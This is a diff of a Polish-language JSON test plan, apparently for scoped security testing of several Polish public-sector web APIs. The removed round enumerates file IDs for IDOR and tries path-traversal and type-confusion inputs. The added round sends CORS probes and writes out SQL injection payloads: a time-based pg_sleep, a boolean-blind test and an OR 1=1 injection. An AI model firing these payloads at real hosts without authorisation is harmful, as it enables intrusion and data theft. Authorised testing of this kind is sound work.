@@ -1,285 +1,160 @@
 {
-  "_opis": "Runda 4: sweep ID w /api/downloadFile (kontrakt potwierdzony: fileId=18864 zwraca realny PNG 2,2 MB). Cel: znaleźć załącznik, który NIE jest publiczny (IDOR poz. 8.9) i sprawdzić twardość walidacji ID.",
-  "_zasady": "Zakres: hosty z scope.example.json. Tempo 2 req/s (regulamin: max 5). Wyłącznie GET, bez ciał, bez logowania, bez brute-force haseł — enumeracja publicznego ID z odstępem 500-1000.",
+  "_opis": "Runda 5: sweep CORS (Origin odbity + credentials) na wszystkich znanych JSON API w zakresie + testy czasowe/boolean SQLi na 116sos.pl/centres-search i science.nask.pl/api/search.",
+  "_zasady": "GET-only, 2 req/s, jeden Origin w nagłówku, żadnych danych uwierzytelniających.",
   "checks": [
     {
-      "id": "s4-dl-100",
+      "id": "s5-cors-science-search",
       "host": "science.nask.pl",
       "method": "GET",
-      "path": "/api/downloadFile?fileId=100",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
+      "path": "/api/search?query=raport&lang=pl",
+      "why": "CORS: czy /api/search odbija dowolny Origin (poz. 8.13, kradzież danych przy credentials).",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
     },
     {
-      "id": "s4-dl-500",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=500",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-1000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=1000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-2000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=2000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-3000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=3000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-4000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=4000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-5000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=5000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-6000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=6000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-7000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=7000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-8000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=8000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-9000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=9000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-10000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=10000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-11000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=11000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-12000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=12000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-13000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=13000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-14000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=14000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-15000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=15000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-16000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=16000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-17000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=17000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-18000",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=18000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-18500",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=18500",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-18800",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=18800",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
-    },
-    {
-      "id": "s4-dl-18864",
+      "id": "s5-cors-science-dl",
       "host": "science.nask.pl",
       "method": "GET",
       "path": "/api/downloadFile?fileId=18864",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
+      "why": "CORS na pobieraniu plików.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
     },
     {
-      "id": "s4-dl-19000",
-      "host": "science.nask.pl",
+      "id": "s5-cors-dns-stats",
+      "host": "dns.pl",
       "method": "GET",
-      "path": "/api/downloadFile?fileId=19000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
+      "path": "/api/zone-stats",
+      "why": "CORS na statystykach domen.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
     },
     {
-      "id": "s4-dl-20000",
-      "host": "science.nask.pl",
+      "id": "s5-cors-dns-count",
+      "host": "dns.pl",
       "method": "GET",
-      "path": "/api/downloadFile?fileId=20000",
-      "why": "Sweep ID załączników WP: Content-Disposition ujawnia nazwę pliku — szukamy plików, które nie są publiczne (IDOR, poz. 8.9).",
-      "class": "8.9"
+      "path": "/api/count-deleted-domains",
+      "why": "CORS na licznikach.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
     },
     {
-      "id": "s4-dl-neg",
-      "host": "science.nask.pl",
+      "id": "s5-cors-116-centres",
+      "host": "116sos.pl",
       "method": "GET",
-      "path": "/api/downloadFile?fileId=-1",
-      "why": "Liczba ujemna: czy walidacja przepuszcza i co robi backend (500 vs 400).",
+      "path": "/api/centres-search?q=Warszawa",
+      "why": "CORS na wyszukiwarce ośrodków (dane adresowe).",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-116-hash",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/fetch-cookie-hash",
+      "why": "CORS na endpoincie ciasteczek.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-bm-news",
+      "host": "bezpiecznymiesiac.pl",
+      "method": "GET",
+      "path": "/api/news/",
+      "why": "CORS na API aktualności (CMS).",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-da-projects",
+      "host": "dataannotation.pllum.org.pl",
+      "method": "GET",
+      "path": "/api/v1/projects/",
+      "why": "CORS na API anotacji (FastAPI) — 401 + odbity Origin z credentials = realne ryzyko.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-cors-da-users",
+      "host": "dataannotation.pllum.org.pl",
+      "method": "GET",
+      "path": "/api/v1/users/",
+      "why": "CORS na liście użytkowników.",
+      "class": "8.13",
+      "headers": {
+        "Origin": "https://arena-probe.example"
+      }
+    },
+    {
+      "id": "s5-sqli-116-base",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa",
+      "why": "Baseline czasu odpowiedzi dla testów czasowych.",
       "class": "info"
     },
     {
-      "id": "s4-dl-big",
+      "id": "s5-sqli-116-sleep",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa%27%3BSELECT%20pg_sleep(5)--",
+      "why": "Time-based SQLi: czy backend czeka 5 s (PostgreSQL).",
+      "class": "4"
+    },
+    {
+      "id": "s5-sqli-116-bool",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa%27%20AND%20%271%27%3D%272",
+      "why": "Boolean-blind: inna liczba wyników niż baseline = SQLi.",
+      "class": "4"
+    },
+    {
+      "id": "s5-sqli-science-or",
       "host": "science.nask.pl",
       "method": "GET",
-      "path": "/api/downloadFile?fileId=2147483648",
-      "why": "Przepełnienie int: 400 czy 500 z błędem SQL/typu.",
+      "path": "/api/search?query=%27%20OR%201%3D1--%20&lang=pl",
+      "why": "SQLi w wyszukiwarce CMS z poprawnym lang (poprzednio WAF uciął żądanie).",
+      "class": "4"
+    },
+    {
+      "id": "s5-science-pagenum",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=a&lang=pl&page=-1",
+      "why": "Ujemna strona: błąd SQL/500 vs normalna obsługa.",
+      "class": "4"
+    },
+    {
+      "id": "s5-bm-postdata",
+      "host": "bezpiecznymiesiac.pl",
+      "method": "GET",
+      "path": "/post-data/",
+      "why": "Ścieżka z bundle'a (fetch) — co zwraca bez danych.",
       "class": "info"
     },
     {
-      "id": "s4-dl-string",
-      "host": "science.nask.pl",
+      "id": "s5-zglos-sendform-post-only",
+      "host": "zglos-dezinformacje.nask.pl",
       "method": "GET",
-      "path": "/api/downloadFile?fileId=18864abc",
-      "why": "Czy walidacja jest ścisła (Invalid file id) czy parsuje prefiks.",
-      "class": "info"
-    },
-    {
-      "id": "s4-dl-array",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId%5B%5D=18864",
-      "why": "Tablica zamiast skalara: typowy błąd PHP/Laravel (500) = sygnał do dalszej analizy.",
-      "class": "info"
-    },
-    {
-      "id": "s4-dl-slash",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/downloadFile?fileId=18864%2F..%2F..%2F18864",
-      "why": "Ścieżka z ID na początku (bypass walidacji, poz. 15).",
-      "class": "15"
-    },
-    {
-      "id": "s4-media-sites1",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/media/wp-content/uploads/sites/1/",
-      "why": "Multisite: czy istnieje podstrona 1 i czy media innych witryn są publiczne.",
-      "class": "info"
-    },
-    {
-      "id": "s4-media-sites2",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/media/wp-content/uploads/sites/2/",
-      "why": "To samo dla witryny 2.",
-      "class": "info"
-    },
-    {
-      "id": "s4-media-sites3",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/media/wp-content/uploads/sites/3/",
-      "why": "To samo dla witryny 3.",
-      "class": "info"
-    },
-    {
-      "id": "s4-media-sites4",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/media/wp-content/uploads/sites/4/",
-      "why": "Kontrola: witryna 4 (science) — znane publiczne media.",
-      "class": "info"
-    },
-    {
-      "id": "s4-media-control",
-      "host": "science.nask.pl",
-      "method": "GET",
-      "path": "/api/media/wp-content/uploads/sites/4/2025/09/out2-scaled-e1758526014428.jpg",
-      "why": "Kontrola publicznego pliku (bez downloadFile) — porównanie z IDOR.",
+      "path": "/api/sendForm",
+      "why": "Potwierdzenie 405 i nagłówków (czy jest Allow/żądanie captchy).",
       "class": "info"
     }
   ]
